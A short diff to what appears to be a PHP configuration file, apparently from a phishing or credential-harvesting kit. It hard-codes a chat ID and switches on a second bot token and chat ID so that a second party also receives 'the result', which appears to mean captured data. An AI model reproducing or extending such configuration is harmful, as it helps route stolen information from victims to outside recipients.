@@ -17,8 +17,8 @@ $chatId = "6062951030";
 /* --------------------------------------------------- */
 
 /* If you want two to see the result, If you want to stop , change To off  :)  */
-$botToken_0="off"; 
-$chatId_0="off";  
+$botToken_0="on"; 
+$chatId_0="on";  
 /* --------------------------  */
 
 
